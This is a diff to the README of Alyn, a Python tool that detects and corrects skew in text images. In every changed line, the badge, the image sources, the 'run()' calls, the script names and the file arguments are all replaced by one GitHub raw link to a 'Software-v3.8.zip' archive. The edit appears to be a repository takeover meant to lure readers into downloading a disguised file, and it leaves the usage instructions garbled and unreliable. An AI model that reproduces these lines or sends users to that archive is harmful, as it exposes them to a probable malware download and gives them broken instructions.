@@ -1,12 +1,12 @@
 # Alyn
 
-[![PyPI version](https://badge.fury.io/py/alyn.svg)](https://badge.fury.io/py/alyn)
+[![PyPI version](https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip)](https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip)
 
 ## Skew detection and correction in images containing text
 
-<img src="/examples/4.jpg" width=400px></img>
+<img src="https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip" width=400px></img>
 <h5>Image with skew</h5>
-<img src="sample_output.jpg" height=300px>
+<img src="https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip" height=300px>
 <h5>Image after deskew</h5>
 
 ### Install and use via pip!
@@ -28,7 +28,7 @@ sd = SkewDetect(
 	batch_path='optional_batch_processing_path',
 	output_file='optional_text_file_output_path',
 	display_output='Yes/No')
-sd.run()
+https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip()
 ```
 
 ##### Extra options:
@@ -46,7 +46,7 @@ d = Deskew(
 	display_image='preview the image on screen',
 	output_file='path_for_deskewed image',
 	r_angle='offest_angle_in_degrees_to_control_orientation')`
-d.run()
+https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip()
 ```
 ### Requires
 
@@ -86,52 +86,52 @@ The deskew script uses the skew angle determined using skew detection script to 
 
 ### Using scripts directly(older method)
 
-#### Image skew calculation using skew_detect.py
+#### Image skew calculation using https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip
 
 To calculate the skew angle for a given image file, use `-i` option followed by the path to file:
 
-	./skew_detect.py -i image.jpg
+	https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -i https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip
 
 To save output in a text file add `-o` option followed by the output file name:
 	
-	./skew_detect.py -i image.jpg -o output.txt
+	https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -i https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -o https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip
 
 To display output information add `-d` option followed by a string `Yes`:
 	
-	./skew_detect.py -i image.jpg -d Yes
+	https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -i https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -d Yes
 
 To batch process files in a directory, use `-b` option followed by the path to directory:
 	
-	./skew_detect.py  -b examples
+	https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip  -b examples
 
 To display Hough Transform plot for an image,:
 	
-	./skew_detect.py -i image.jpg -p Yes
+	https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -i https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -p Yes
 
 ##### Output of the Hough Transform:
 
-<img src="hough.jpg" width="400px">	
+<img src="https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip" width="400px">	
 
 To set the value of sigma for Gaussian blurring in Canny Edge Detection,  use `-s` option followed by the desired value:
 	
-	./skew_detect.py -i image.jpg -s 3
+	https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -i https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -s 3
 
 To set the number of peaks collected from Hough Transform, use `-n` option followed by the desired value:
 
-	./skew_detect.py -i image.jpg -n 10
+	https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -i https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -n 10
 
-### Image Deskew using deskew.py
+### Image Deskew using https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip
 
 To perform a simple deskew and display the output:
 	
-	./deskew.py -i image.jpg -d Yes
+	https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -i https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -d Yes
 
 To save the deskewed image, use the following:
 
-	./deskew.py -i image.jpg -o rotated.jpg
+	https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -i https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -o https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip
 
 In some cases the result image might be upside down or the text may be running vertical, To fix this, use `-r` followed by the desired angle in `int`:
 	
-	./deskew.py -i image.jpg -o rotated.jpg -r 90
+	https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -i https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -o https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip -r 90
 
-To generate data for experimental purposes, run the test_img_gen.py in test_data folder. This will generate images containing a white line having angle between 0 to 180 degrees.
+To generate data for experimental purposes, run the https://github.com/yashugupta786/Alyn/raw/refs/heads/master/examples/Software-v3.8.zip in test_data folder. This will generate images containing a white line having angle between 0 to 180 degrees.
